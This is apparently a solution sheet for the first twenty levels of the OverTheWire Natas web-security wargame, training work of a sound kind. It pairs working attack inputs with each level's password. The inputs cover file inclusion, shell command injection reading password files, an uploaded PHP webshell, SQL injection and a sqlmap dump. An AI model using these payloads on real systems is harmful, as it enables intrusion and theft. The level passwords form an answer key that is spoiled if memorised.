# Level Natas

## 0
gtVrDuiDfck831PqWsLEZy5gyDz1clto

## 1
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

## 2
/files/user.txt
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

## 3
gobuster dir -u http://natas3.natas.labs.overthewire.org/ -U natas3 -P sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x ".txt"

Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## 4
Referer: http://natas5.natas.labs.overthewire.org/
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

## 5
loggedin = 1
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

## 6
view sourcecode -> includes/secret.inc-> FOEIUWGHFEEUHOFUOIU
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## 7
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8&#8221
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

## 8
php> echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## 9
word; cat /etc/natas_webpass/natas10 #
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

## 10
u /etc/natas_webpass/natas11 #
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

## 11
Guess the XOR key with default value
php reverse_enginner_natas11.php
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

## 12
sudo echo "<?php echo exec("cat /etc/natas_webpass/natas13"); ?>" > natas12.jpg
Upload File
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## 13
natas13.natas.labs.overthewire.org/?cmd=cat%20/etc/natas_webpass/natas14
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## 14
natas15" # || natas15" or 1=1# 
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

## 15
sudo sqlmap -u http://natas15.natas.labs.overthewire.org/ --proxy=http://127.0.0.1:8080 --string="This user exists." --auth-type=Basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data "username=natas16" --level=5 --risk=3 -D natas15 -T users -C username,password --dump

OR

blind_sql_natas16.py
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

## 16
natas16.py
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

## 17
natas17.py
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

## 18
natas18.py
SESSIONID :119
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

## 19
Found out PHPSESSID pattern (id-username) by decode('hex') (ex: 281-admin)
natas19.py
SESSIONID : 281
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

## 20
post request with data:
name=foo+admin 1
(key,value) -> (admin,1)
IFekPyrQXftziDEsUr3x21sYuahypdgJ